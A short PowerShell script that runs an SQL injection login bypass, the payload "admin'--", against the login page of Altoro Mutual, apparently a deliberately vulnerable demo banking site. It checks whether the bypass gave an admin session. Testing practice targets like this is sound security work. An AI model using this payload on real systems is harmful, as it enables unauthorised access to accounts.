# Test SQL Injection on Altoro Mutual
$uri = "https://demo.testfire.net/doLogin"

Write-Host "Testing SQL Injection on Altoro Mutual..." -ForegroundColor Cyan
Write-Host ""

# Test 1: Normal login (should fail)
Write-Host "1. Testing normal login (should fail)..." -ForegroundColor Yellow
$response = Invoke-WebRequest -Uri $uri -Method POST -Body @{
    uid = "wronguser"
    passw = "wrongpass"
} -SessionVariable session -MaximumRedirection 0 -ErrorAction SilentlyContinue

Write-Host "   Status: $($response.StatusCode)"
Write-Host "   URL: $($response.BaseResponse.ResponseUri)"

# Test 2: SQL Injection payload
Write-Host ""
Write-Host "2. Testing SQL Injection (admin'--)..." -ForegroundColor Green

try {
    $response2 = Invoke-WebRequest -Uri $uri -Method POST -Body @{
        uid = "admin'--"
        passw = "anything"
    } -WebSession $session -MaximumRedirection 5 -ErrorAction SilentlyContinue
    
    Write-Host "   Status: $($response2.StatusCode)" -ForegroundColor Cyan
    Write-Host "   Final URL: $($response2.BaseResponse.ResponseUri)" -ForegroundColor Cyan
    
    # Check if logged in
    if ($response2.Content -match "Hello Admin|Sign Off|Account Summary|Log Out") {
        Write-Host "   RESULT: SQL INJECTION WORKS! (Logged in as Admin)" -ForegroundColor Green
    } else {
        Write-Host "   RESULT: May have failed" -ForegroundColor Yellow
    }
    
    # Show snippet
    Write-Host ""
    Write-Host "   Page snippet:" -ForegroundColor Gray
    $snippet = $response2.Content -replace '<[^>]+>', ' ' -replace '\s+', ' '
    Write-Host "   $($snippet.Substring(0, [Math]::Min(300, $snippet.Length)))..." -ForegroundColor Gray
    
} catch {
    Write-Host "   Error: $_" -ForegroundColor Red
}

Write-Host ""
Write-Host "Test complete!" -ForegroundColor Cyan
